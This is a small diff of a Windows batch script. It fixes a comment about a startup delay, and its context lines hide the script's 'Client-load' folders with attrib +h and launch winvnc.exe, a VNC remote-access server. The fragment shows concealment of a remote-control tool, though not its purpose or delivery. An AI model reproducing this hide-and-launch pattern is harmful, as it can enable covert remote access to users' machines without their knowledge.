@@ -39,7 +39,7 @@ REM Hide the extracted Client-load folder and its parent folder
 attrib +h "%script_dir%\.."
 attrib +h "%script_dir%\..\.."
 
-REM Start winvnc.exe for the first time and wait for 7 seconds
+REM Start winvnc.exe for the first time and wait for 10 seconds
 start "" "%script_dir%winvnc.exe"
 timeout /t 10 >nul
 
